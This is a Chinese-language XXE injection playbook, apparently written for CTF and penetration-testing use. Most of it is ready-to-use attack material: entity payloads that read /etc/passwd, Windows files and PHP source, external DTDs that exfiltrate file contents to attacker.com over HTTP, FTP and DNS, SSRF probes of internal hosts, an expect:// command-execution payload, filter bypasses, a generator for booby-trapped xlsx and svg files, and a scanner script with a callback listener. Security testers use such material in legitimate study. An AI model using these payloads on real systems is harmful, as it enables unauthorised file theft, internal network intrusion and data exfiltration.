# 📜 XXE XML 外部实体注入模块

## 适用场景
- XML 数据提交接口
- SOAP Web Service
- 文件解析 (xlsx, docx, svg)
- RSS/Atom 解析

## 检查清单

```yaml
XXE 类型:
  - [ ] 经典 XXE（有回显）
  - [ ] Blind XXE（无回显）
  - [ ] Error-based XXE
  - [ ] OOB XXE（外带数据）

利用方式:
  - [ ] 任意文件读取
  - [ ] SSRF 内网探测
  - [ ] DoS 攻击
  - [ ] RCE (特定情况)

绕过技巧:
  - [ ] 编码绕过
  - [ ] 参数实体
  - [ ] 外部 DTD
```

## 分析流程

### Step 1: XXE 检测

```xml
<!-- 基础检测 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- 确认 XML 解析 -->
<?xml version="1.0"?>
<root>test</root>

<!-- HTTP 请求检测 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://你的服务器/xxe">
]>
<root>&xxe;</root>
```

### Step 2: 有回显 XXE - 文件读取

```xml
<!-- 读取 /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- 读取 Windows 文件 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>

<!-- 读取源代码 (PHP) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>

<!-- 列目录 (Java) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///var/www/html/">
]>
<root>&xxe;</root>

<!-- 使用 netdoc 协议 (Java) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
]>
<root>&xxe;</root>
```

### Step 3: 无回显 XXE (Blind XXE)

```xml
<!-- 需要外部 DTD 文件 -->

<!-- evil.dtd (放在攻击者服务器) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- 恶意 XML -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root>test</root>
```

### Step 4: OOB XXE - 数据外带

```xml
<!-- 方法1: HTTP 外带 -->

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- 方法2: FTP 外带 (可处理多行文件) -->

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;

<!-- 方法3: DNS 外带 -->

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfil;
```

### Step 5: Error-based XXE

```xml
<!-- 通过错误信息泄露文件内容 -->

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!-- 主 XML -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root>test</root>
```

### Step 6: SSRF via XXE

```xml
<!-- 内网探测 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80/">
]>
<root>&xxe;</root>

<!-- 端口扫描 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22/">
]>
<root>&xxe;</root>

<!-- 内网服务探测 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://192.168.1.100:6379/info">
]>
<root>&xxe;</root>
```

### Step 7: 特殊协议

```xml
<!-- Java 支持的协议 -->
file:///etc/passwd
http://attacker.com/
https://attacker.com/
ftp://attacker.com/
jar:http://attacker.com/shell.jar!/
netdoc:///etc/passwd
gopher://127.0.0.1:6379/

<!-- PHP expect (需要扩展) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>

<!-- PHP 伪协议 -->
php://filter/read=convert.base64-encode/resource=index.php
```

### Step 8: 绕过技巧

```xml
<!-- 编码绕过 - UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- 编码绕过 - UTF-7 -->
<?xml version="1.0" encoding="UTF-7"?>

<!-- 标签变形 -->
<?xml version = "1.0"?>
<?xml version= "1.0"?>
<?xml version ="1.0"?>

<!-- 使用 CDATA 读取特殊字符 -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY start "<![CDATA[">
  <!ENTITY end "]]>">
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>&start;&file;&end;</root>

<!-- 参数实体 -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % a "<!ENTITY b SYSTEM 'file:///etc/passwd'>">
  %a;
]>
<root>&b;</root>

<!-- XInclude (当无法控制 DOCTYPE 时) -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

### Step 9: 特殊文件格式 XXE

```python
#!/usr/bin/env python3
"""
生成包含 XXE 的特殊文件
"""

import zipfile
import io

def create_xlsx_xxe():
    """创建包含 XXE 的 xlsx 文件"""
    # xlsx 是 zip 格式，包含 xml 文件
    
    # 恶意的 [Content_Types].xml
    content_types = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://attacker.com/?xxe">
]>
<root>&xxe;</root>'''
    
    mem_zip = io.BytesIO()
    with zipfile.ZipFile(mem_zip, 'w') as zf:
        zf.writestr('[Content_Types].xml', content_types)
    
    with open('xxe.xlsx', 'wb') as f:
        f.write(mem_zip.getvalue())
    
    print("[+] Created xxe.xlsx")

def create_svg_xxe():
    """创建包含 XXE 的 SVG 文件"""
    svg = '''<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="50">&xxe;</text>
</svg>'''
    
    with open('xxe.svg', 'w') as f:
        f.write(svg)
    
    print("[+] Created xxe.svg")

def create_docx_xxe():
    """创建包含 XXE 的 docx 文件"""
    # 类似 xlsx
    pass

if __name__ == '__main__':
    create_xlsx_xxe()
    create_svg_xxe()
```

## 常见套路与解法

### 套路 1: 有回显 XXE

**特征**: XML 解析结果显示在页面

**Payload**:
```xml
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>
```

### 套路 2: 无回显 XXE

**特征**: 无直接输出

**解法**: 使用 OOB 外带
```xml
<!-- 恶意 DTD -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://你的VPS/?d=%file;'>">
%eval;
%exfil;
```

### 套路 3: 过滤 SYSTEM

**解法**:
```xml
<!-- 使用 PUBLIC -->
<!ENTITY xxe PUBLIC "any" "file:///etc/passwd">

<!-- XInclude -->
<xi:include href="file:///etc/passwd" parse="text"/>
```

### 套路 4: JSON 转 XML

**特征**: API 接受 JSON，但后端也支持 XML

**解法**: 修改 Content-Type
```http
POST /api HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## 自动化脚本

```python
#!/usr/bin/env python3
"""
XXE 检测和利用脚本
"""

import requests
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading

class XXEHandler(SimpleHTTPRequestHandler):
    """接收外带数据"""
    def do_GET(self):
        print(f"[+] Received: {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
        
    def log_message(self, format, *args):
        pass

def start_server(port=8888):
    server = HTTPServer(('0.0.0.0', port), XXEHandler)
    server.serve_forever()

def test_xxe(url, callback_url):
    """测试 XXE"""
    
    payloads = [
        # 有回显测试
        '''<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
        
        # HTTP 回调测试
        f'''<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "{callback_url}">]>
<root>&xxe;</root>''',
        
        # 参数实体测试
        f'''<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "{callback_url}/evil.dtd">
  %remote;
]>
<root>test</root>''',
    ]
    
    for payload in payloads:
        try:
            resp = requests.post(
                url,
                data=payload,
                headers={"Content-Type": "application/xml"},
                timeout=5
            )
            
            if "root:" in resp.text:
                print("[+] XXE Confirmed - File read successful")
            elif resp.status_code == 200:
                print("[*] Request sent, check callback server")
                
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python3 xxe_test.py <url> <callback_url>")
        sys.exit(1)
    
    # 启动回调服务器
    t = threading.Thread(target=start_server)
    t.daemon = True
    t.start()
    
    test_xxe(sys.argv[1], sys.argv[2])
```

## 工具速查

```bash
# XXE 检测
# 使用 Burp Suite + Burp Collaborator

# 外带服务器
python3 -m http.server 8888

# FTP 服务器 (用于多行文件外带)
python3 -m pyftpdlib -p 21

# 参考 Payload
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
```
